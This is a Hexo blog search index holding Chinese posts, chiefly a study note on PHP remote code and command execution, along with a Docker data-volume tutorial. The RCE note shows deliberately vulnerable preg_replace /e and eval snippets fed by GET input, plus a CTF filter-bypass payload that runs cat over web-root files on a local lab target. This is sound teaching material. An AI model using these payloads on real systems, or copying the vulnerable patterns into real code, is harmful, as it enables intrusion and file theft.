<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/undefined/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/undefined/RCE/</url>
    <content><![CDATA[<h1 id="RCE漏洞原理"><a href="#RCE漏洞原理" class="headerlink" title="RCE漏洞原理"></a><center>RCE漏洞原理<center></h1><h5 id="英文全称：remote-command-code-execute-远程命令-代码执行漏洞-；"><a href="#英文全称：remote-command-code-execute-远程命令-代码执行漏洞-；" class="headerlink" title="英文全称：remote command/code execute(远程命令/代码执行漏洞)；"></a>英文全称：remote command/code execute(远程命令/代码执行漏洞)；</h5><h3 id="RCE分为远程命令执行和远程代码执行"><a href="#RCE分为远程命令执行和远程代码执行" class="headerlink" title="RCE分为远程命令执行和远程代码执行"></a>RCE分为<font color = red>远程命令执行</font>和<font color = red>远程代码执行</font></h3><p>区别：   </p>
<ul>
<li>能够对一个php的站点，控制php代码，那么我们就把它划分为代码执行      </li>
<li>如果能执行网站所在服务器中的命令，我们这就把它划分为命令执行，因为它执行的是系统命令</li>
</ul>
<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a><font color = gree>远程命令执行</font></h2><h4 id="命令执行漏洞指的是可以执行系统或者应用指令的漏洞"><a href="#命令执行漏洞指的是可以执行系统或者应用指令的漏洞" class="headerlink" title="命令执行漏洞指的是可以执行系统或者应用指令的漏洞"></a>命令执行漏洞指的是可以执行系统或者应用指令的漏洞</h4><p>如CMD命令或者bash命令的漏洞，PHP的命令执行漏洞主要基于一些函数的参数过滤不严导致，可以执行命令的函数有:<br><font color =red >system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open(),ob_start()，mail函数+LD_PRELOAD </font><br>执行系统命令共九个函数,另外反引号(`)也可以执行命令,不过实际上这种方式也是调用的shell_exec()函数。</p>
<h2 id="讲解函数"><a href="#讲解函数" class="headerlink" title="讲解函数"></a><font color = gree>讲解函数</font></h2><p>php提供了system(),exec(),passthru()这几个函数来调用外部的命令.    </p>
<p><font color = red>他们的区别 :</font>   </p>
<ul>
<li>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，第三个参数用来取得命令执行的状态码，通常执行成功都是返回０。  </li>
<li>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</li>
<li>passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。   </li>
</ul>
<p><font color = red>相同点:</font>  </p>
<ul>
<li>都可以获得命令执行的状态码  <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Linux下一条命令或一个进程执行完成会返回一个一个状态码。</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>   ===   成功执行</span><br><span class="line"></span><br><span class="line">非<span class="number">0</span> ===  执行过程中出现异常或非正常退出</span><br></pre></td></tr></table></figure>
在PHP中调用外部命令，可以用如下三种方法来实现：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"system('whoami'):   "</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">system(<span class="string">'whoami'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"var_dump(exec('ipconfig')):   "</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">var_dump(exec(<span class="string">'ipconfig'</span>));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'exec(whoami,$b):'</span>;</span></span><br><span class="line"><span class="php">exec(<span class="string">'whoami'</span>,$b);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">var_dump($b);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"exec('whoami')"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">exec(<span class="string">'whoami'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"passthru('whoami'):"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">passthru(<span class="string">'whoami'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"shell_exec('ipconfig')"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<h3 id="popen-函数"><a href="#popen-函数" class="headerlink" title="popen()函数"></a><font color = red>popen()函数</font></h3>popen()丶proc_open()函数不会直接返回执行结果，而是返回一个文件指针，但命令是已经执行了的，下面我们看看 popen()的用法,它需要两个参数,一个是执行的命令,另<br>外一个是指针文件的连接模式，有r 和 w代表读和写。<br>测试代码如下：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">windows下</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">popen(<span class="string">'dir &gt;&gt;E:/2.txt'</span>,<span class="string">'w'</span>)</span></span><br><span class="line"><span class="php"><span class="comment">//把标准输出重定向到一个文件中(追加)</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">linux下：</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file = popen(<span class="string">"/bin/ls"</span>,<span class="string">"r"</span>);</span></span><br><span class="line"><span class="php"><span class="comment">//some code to be executed</span></span></span><br><span class="line"><span class="php">pclose($file);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<h2 id="CTF例题："><a href="#CTF例题：" class="headerlink" title="CTF例题："></a><font color = gree>CTF例题：</font></h2></li>
<li>DVWA靶场命令执行题<br><a href="http://127.0.0.1:8000/DVWA/vulnerabilities/exec/" target="_blank" rel="noopener">http://127.0.0.1:8000/DVWA/vulnerabilities/exec/</a></li>
</ul>
<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a><font color = gree>远程代码执行</font></h2><p>代码执行漏洞是指应用程序本身过滤不严,用户可以通过请求将代码注入到应用中执行.说得好理解一点类似于SQL注人漏洞,可以把SQL语句注入到SQL服务执行，而PHP代码执行漏洞则是可以把代码注入<br>到应用中，最终到Webserver去执行。   </p>
<p>这样的漏洞如果没有特殊的过滤，相当于直接有一个Web后门存在，该漏洞主要由<font color = red>eval()、assert()、preg_replace()、call_user_func()call_user_func_array()、array_map()</font>等函数的参数过滤不严格导致     </p>
<p>另外还有PHP的动态函数（$a($b))也是目前出现比较多的。</p>
<h2 id="讲解函数-1"><a href="#讲解函数-1" class="headerlink" title="讲解函数"></a><font color = gree>讲解函数</font></h2><h3 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a><font color = red>eval()函数</font></h3><p>eval() 函数把字符串按照 PHP 代码来计算。<br>该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>如果代码中存在解析错误，则 eval() 函数返回 false。   </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = <span class="string">'aaa'</span>;</span></span><br><span class="line"><span class="php">$b = <span class="string">'bbb'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'$a=$b;'</span>);</span></span><br><span class="line"><span class="php">var_dump($a);</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'echo 1111;'</span>);</span></span><br></pre></td></tr></table></figure>
<p>代码不能包含打开/关闭PHP标签，但可以用合适的 PHP tag 来闭合离开、重新进入 PHP 模式。   </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'&lt;?php echo "Hi!"; ?&gt;'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'echo "In PHP mode!"; ?&gt;In HTML mode!&lt;?php echo "Hi!";'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span>闭合php文件开头的<span class="php"><span class="meta">&lt;?php</span>，<span class="meta">&lt;?</span>=可以输出。</span></span><br><span class="line"><span class="php">另外这里<span class="meta">&lt;?</span> <span class="meta">?&gt;</span></span>是短标签，<span class="php"><span class="meta">&lt;?php</span> <span class="meta">?&gt;</span></span>是长标签。在php的配置文件php.ini中有一个short_open_tag的值，开启以后可以使用PHP的短标签：<span class="php"><span class="meta">&lt;?</span> <span class="meta">?&gt;</span></span>同时，</span><br><span class="line">只有开启这个才可以使用 <span class="php"><span class="meta">&lt;?</span>= 以代替 <span class="meta">&lt;?</span> <span class="keyword">echo</span>。不过在php7中这个标签被移除了。</span></span><br><span class="line"><span class="php">~~~ </span></span><br><span class="line"><span class="php"><span class="comment">### &lt;font color = red&gt;assert()函数&lt;/font&gt;  </span></span></span><br><span class="line"><span class="php">bool assert ( mixed $assertion [, string $description ] )    </span></span><br><span class="line"><span class="php">在PHP语言中是用来判断一个表达式是否成立，返回<span class="keyword">true</span> <span class="keyword">or</span> <span class="keyword">false</span>。    </span></span><br><span class="line"><span class="php">如果assertion 是字符串，它将会被assert（）当做PHP代码来执行。</span></span><br></pre></td></tr></table></figure>
<?php
$s = 123;
var_dump(assert("is_int($s)"));
?>

<?php
function fo(){
  $fp = fopen("E://2.txt",'w');
  fwrite($fp,"123");
  fclose($fp);
  return true;
}
var_dump(assert("fo()"));
?>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">函数原理：https:<span class="comment">//www.jianshu.com/p/6f7cc896ba2a</span></span><br><span class="line">### &lt;font color = red&gt;preg_replace()函数&lt;/font&gt; </span><br><span class="line">preg_replace 函数的作用是对字符串进行正则处理，执行一个正则表达式的搜索和替换,它经常会出现漏洞的位置，下面我们来看看它在什么情况下才会出现代码执行漏洞。这个函数比较早，<span class="number">5.5</span>中它已经被弃用了，但是你一样可以去使用它，但是在<span class="number">7.0</span>之后，你就没办法去调用。    </span><br><span class="line"></span><br><span class="line">它的参数和返回如下：   </span><br><span class="line"></span><br><span class="line">&lt;font color = blue&gt;mixed preg_replace ( mixed <span class="symbol">$</span>pattern , mixed <span class="symbol">$</span>replacement , mixed <span class="symbol">$</span>subject [, int <span class="symbol">$</span>limit = <span class="number">-1</span> [, int &amp;<span class="symbol">$</span>count ]] )&lt;/font&gt;    </span><br><span class="line"></span><br><span class="line">搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换。   </span><br><span class="line">参数说明：   </span><br><span class="line"><span class="meta"><span class="meta-keyword">$pattern</span>: 要搜索的模式，可以是字符串或一个字符串数组。   </span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$replacement</span>: 用于替换的字符串或字符串数组。   </span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$subject</span>: 要搜索替换的目标字符串或字符串数组。   </span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$limit</span>: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。    </span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$count</span>: 可选，为替换执行的次数。</span></span><br></pre></td></tr></table></figure>
<?php
@preg_replace("/\[(.*)\]/e",'\\1',$_GET['str']);
//preg_replace函数需要使用/e修饰符执行正则。
?>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">正则的意思是GET传递的str变量里搜索中括号口中间的内容作为第一组结果， preg_replace（）函数</span><br><span class="line">第二个参数为 '\\\<span class="number">1</span>'代表这里用第一组结果填充，这里是可以直接执行代码的，所以当我们请求 /<span class="number">1</span>.php?str=[phpinfo()]时，则执行代码&lt;font color = red&gt;phpinfo()&lt;/font&gt;      </span><br><span class="line">这个函数比较复杂，感兴趣的可以去这个博客看看   </span><br><span class="line"></span><br><span class="line">https://mochazz.github.io/<span class="number">2018</span>/<span class="number">08</span>/<span class="number">13</span>/<span class="symbol">%E6</span><span class="symbol">%B7</span><span class="symbol">%B1</span><span class="symbol">%E5</span><span class="symbol">%85</span><span class="symbol">%A5</span><span class="symbol">%E7</span><span class="symbol">%A0</span><span class="symbol">%94</span><span class="symbol">%E7</span><span class="symbol">%A9</span><span class="symbol">%B6preg_replace</span><span class="symbol">%E4</span><span class="symbol">%B8</span><span class="symbol">%8</span>E<span class="symbol">%E4</span><span class="symbol">%BB</span><span class="symbol">%A3</span><span class="symbol">%E7</span><span class="symbol">%A0</span><span class="symbol">%81</span><span class="symbol">%E6</span><span class="symbol">%89</span><span class="symbol">%A7</span><span class="symbol">%E8</span><span class="symbol">%A1</span><span class="symbol">%8</span>C/#<span class="symbol">%E6</span><span class="symbol">%A1</span><span class="symbol">%88</span><span class="symbol">%E4</span><span class="symbol">%BE</span><span class="symbol">%8</span>B</span><br><span class="line"></span><br><span class="line">### &lt;font color = red&gt;eval()函数例题：&lt;/font&gt;</span><br><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8000</span>/anhengweb<span class="number">2</span>.php</span><br></pre></td></tr></table></figure>
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>35){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  "php function getFlag() to get flag";
?>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">/bin/cat 执行命令    </span><br><span class="line"><span class="string">``</span>反单引号执行命令</span><br></pre></td></tr></table></figure>
<p>?&gt;<?=`/???/???%20/???/???/????/*`?><br>“/bin/cat /var/www/html/*”</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span> = <span class="string">red</span>&gt;</span>无字母数字preg_match绕过<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/v01cano/p/11736722.html" target="_blank" rel="noopener">https://www.cnblogs.com/v01cano/p/11736722.html</a></p>
<pre><code></code></pre>]]></content>
      <categories>
        <category>远程代码/命令执行</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerfile创建数据卷</title>
    <url>/undefined/dockerfile%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%8D%B7/</url>
    <content><![CDATA[<h1 id="DockerFile-创建数据卷"><a href="#DockerFile-创建数据卷" class="headerlink" title="DockerFile 创建数据卷"></a><font color=red>DockerFile 创建数据卷</font></h1><p>在 Dockerfile 中使用 Volume 指令来给镜像添加一个或多个数据卷。<br>语法格式：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="bash">[<span class="string">"/dataVolumeContainer1"</span>,<span class="string">"/dataVolumeContainer2"</span>]</span></span><br></pre></td></tr></table></figure>
<p>说明：<br>出于可移值和分享的考虑，用 -v 主机目录:容器目录 这种方法 不能够直接在Dockerfile中实现。  </p>
<p>由于宿主机目录是依赖于特定宿主机的，并不能保证在所有宿主机上都存在这样的特定目录。</p>
<h2 id="根目录下新建-mydocker-目录并进入"><a href="#根目录下新建-mydocker-目录并进入" class="headerlink" title="根目录下新建 mydocker 目录并进入"></a><font color = gree >根目录下新建 mydocker 目录并进入</font></h2><h3 id="终端container："><a href="#终端container：" class="headerlink" title="终端container：  "></a><font color = gree>终端container：  </font></h3><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root@localhost /</span>]<span class="meta"># mkdir /mydocker</span></span><br><span class="line">[<span class="meta">root@localhost /</span>]<span class="meta"># cd mydocker/</span></span><br><span class="line">[<span class="meta">root@localhost mydocker</span>]<span class="meta"># pwd</span></span><br><span class="line">/mydocker</span><br><span class="line">[<span class="meta">root@localhost mydocker</span>]<span class="meta">#</span></span><br><span class="line">[<span class="meta">root@localhost mydocker</span>]<span class="meta"># vi Dockerfile</span></span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「xiaojin21cen」的原创文章，遵循CC <span class="number">4.0</span> BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:<span class="comment">//blog.csdn.net/xiaojin21cen/java/article/details/84501206</span></span><br></pre></td></tr></table></figure>
<h2 id="Dockerfile-："><a href="#Dockerfile-：" class="headerlink" title="Dockerfile ："></a><font color = gree>Dockerfile ：</font></h2><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># volume test</span></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"/dataVolumeContainer1"</span>,<span class="string">"/dataVolumeContainer2"</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"finished,------success1"</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br></pre></td></tr></table></figure>
<p>说明：<br>上面的 Dockerfile 的内容 等价于</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">docker run -it -v <span class="string">/host1</span>:<span class="string">/dataVolumeContainer1</span> -v <span class="string">/host2</span>:<span class="string">/dataVolumeContainer2</span> centos <span class="string">/bin/bash</span></span><br></pre></td></tr></table></figure>
<h2 id="docker-build-：构建镜像"><a href="#docker-build-：构建镜像" class="headerlink" title="docker build ：构建镜像"></a><font color = gree>docker build ：构建镜像</font></h2><p>格式：  </p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">docker build -f(<span class="keyword">file</span>容器卷) <span class="regexp">/mydocker/</span>Dockerfile -t zzyy<span class="regexp">/centos(镜像名) .</span></span><br></pre></td></tr></table></figure>
<p>注意，最后一位是个点（.）   </p>
<p>操作内容：   </p>
<p>终端container：   </p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">[root@localhost mydocker]<span class="comment"># vi Dockerfile</span></span><br><span class="line">[root@localhost mydocker]<span class="comment"># ls</span></span><br><span class="line">Dockerfile</span><br><span class="line">[root@localhost mydocker]<span class="comment"># cat Dockerfile </span></span><br><span class="line"><span class="comment"># volume test</span></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"/dataVolumeContainer1"</span>,<span class="string">"/dataVolumeContainer2"</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"finished,------success1"</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line">[root@localhost mydocker]<span class="comment"># docker build -f /mydocker/Dockerfile -t zzyy/centos .</span></span><br><span class="line">Sending build context to Docker daemon  <span class="number">2.048</span>kB</span><br><span class="line">Step <span class="number">1</span>/<span class="number">4</span> : <span class="keyword">FROM</span> centos</span><br><span class="line"> ---&gt; <span class="number">75835</span>a67d134</span><br><span class="line">Step <span class="number">2</span>/<span class="number">4</span> : <span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"/dataVolumeContainer1"</span>,<span class="string">"/dataVolumeContainer2"</span>]</span></span><br><span class="line"> ---&gt; Running in <span class="number">041</span>cc7e7d58f</span><br><span class="line">Removing intermediate container <span class="number">041</span>cc7e7d58f</span><br><span class="line"> ---&gt; b49f99cf2001</span><br><span class="line">Step <span class="number">3</span>/<span class="number">4</span> : <span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"finished,------success1"</span></span></span><br><span class="line"> ---&gt; Running in <span class="number">2</span>e8ed8aedbff</span><br><span class="line">Removing intermediate container <span class="number">2</span>e8ed8aedbff</span><br><span class="line"> ---&gt; <span class="number">8</span>ec90a7d9d43</span><br><span class="line">Step <span class="number">4</span>/<span class="number">4</span> : <span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"> ---&gt; Running in fb87df9d2666</span><br><span class="line">Removing intermediate container fb87df9d2666</span><br><span class="line"> ---&gt; <span class="number">1846</span>c594f7f9</span><br><span class="line">Successfully built <span class="number">1846</span>c594f7f9</span><br><span class="line">Successfully tagged zzyy/centos:latest</span><br><span class="line">[root@localhost mydocker]<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h3 id="查看镜像："><a href="#查看镜像：" class="headerlink" title="查看镜像：  "></a><font color = gree>查看镜像：  </font></h3><p>终端container：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost mydocker]# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">zzyy/centos         latest              <span class="number">1846</span>c594f7f9        <span class="number">42</span> seconds ago      <span class="number">200</span>MB</span><br><span class="line">atguigu/mytomcat    <span class="number">1.2</span>                 b105c1f52eb5        <span class="number">8</span> hours ago         <span class="number">463</span>MB</span><br><span class="line">redis               latest              c188f257942c        <span class="number">9</span> days ago          <span class="number">94.9</span>MB</span><br><span class="line">tomcat              latest              ca9e2fccef98        <span class="number">3</span> weeks ago         <span class="number">463</span>MB</span><br><span class="line">centos              latest              <span class="number">75835</span>a67d134        <span class="number">6</span> weeks ago         <span class="number">200</span>MB</span><br><span class="line">[<span class="symbol">root@</span>localhost mydocker]#</span><br></pre></td></tr></table></figure>
<h2 id="测试新构建的容器"><a href="#测试新构建的容器" class="headerlink" title="测试新构建的容器"></a><font color = gree>测试新构建的容器</font></h2><p>终端container：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost mydocker]# docker run -it  zzyy/centos</span><br><span class="line">[<span class="symbol">root@</span><span class="number">299</span>d9be66cf2 /]# pwd</span><br><span class="line">/</span><br><span class="line">[<span class="symbol">root@</span><span class="number">299</span>d9be66cf2 /]# </span><br><span class="line">[<span class="symbol">root@</span><span class="number">299</span>d9be66cf2 /]# ll</span><br><span class="line">total <span class="number">12</span></span><br><span class="line">-rw-r--r--.   <span class="number">1</span> root root <span class="number">12030</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">15</span> anaconda-post.log</span><br><span class="line">lrwxrwxrwx.   <span class="number">1</span> root root     <span class="number">7</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Nov <span class="number">25</span> <span class="number">10</span>:<span class="number">31</span> dataVolumeContainer1</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Nov <span class="number">25</span> <span class="number">10</span>:<span class="number">31</span> dataVolumeContainer2</span><br><span class="line">drwxr-xr-x.   <span class="number">5</span> root root   <span class="number">360</span> Nov <span class="number">25</span> <span class="number">10</span>:<span class="number">31</span> dev</span><br><span class="line">drwxr-xr-x.   <span class="number">1</span> root root    <span class="number">66</span> Nov <span class="number">25</span> <span class="number">10</span>:<span class="number">31</span> etc</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Apr <span class="number">11</span>  <span class="number">2018</span> home</span><br><span class="line">lrwxrwxrwx.   <span class="number">1</span> root root     <span class="number">7</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx.   <span class="number">1</span> root root     <span class="number">9</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> lib64 -&gt; usr/lib64</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Apr <span class="number">11</span>  <span class="number">2018</span> media</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Apr <span class="number">11</span>  <span class="number">2018</span> mnt</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Apr <span class="number">11</span>  <span class="number">2018</span> opt</span><br><span class="line">dr-xr-xr-x. <span class="number">280</span> root root     <span class="number">0</span> Nov <span class="number">25</span> <span class="number">10</span>:<span class="number">31</span> proc</span><br><span class="line">dr-xr-x---.   <span class="number">2</span> root root   <span class="number">114</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">15</span> root</span><br><span class="line">drwxr-xr-x.  <span class="number">10</span> root root   <span class="number">130</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">15</span> run</span><br><span class="line">lrwxrwxrwx.   <span class="number">1</span> root root     <span class="number">8</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Apr <span class="number">11</span>  <span class="number">2018</span> srv</span><br><span class="line">dr-xr-xr-x.  <span class="number">13</span> root root     <span class="number">0</span> Nov <span class="number">25</span> <span class="number">06</span>:<span class="number">17</span> sys</span><br><span class="line">drwxrwxrwt.   <span class="number">7</span> root root   <span class="number">132</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">15</span> tmp</span><br><span class="line">drwxr-xr-x.  <span class="number">13</span> root root   <span class="number">155</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> usr</span><br><span class="line">drwxr-xr-x.  <span class="number">18</span> root root   <span class="number">238</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> var</span><br><span class="line">[<span class="symbol">root@</span><span class="number">299</span>d9be66cf2 /]#</span><br></pre></td></tr></table></figure>
<p>创建并运行容器后，发现自动创建了两个数据卷</p>
<h2 id="docker-inspect-查看容器数据卷"><a href="#docker-inspect-查看容器数据卷" class="headerlink" title="docker inspect 查看容器数据卷"></a><font color = gree >docker inspect 查看容器数据卷</font></h2><p>查找对应的主机目录地址。</p>
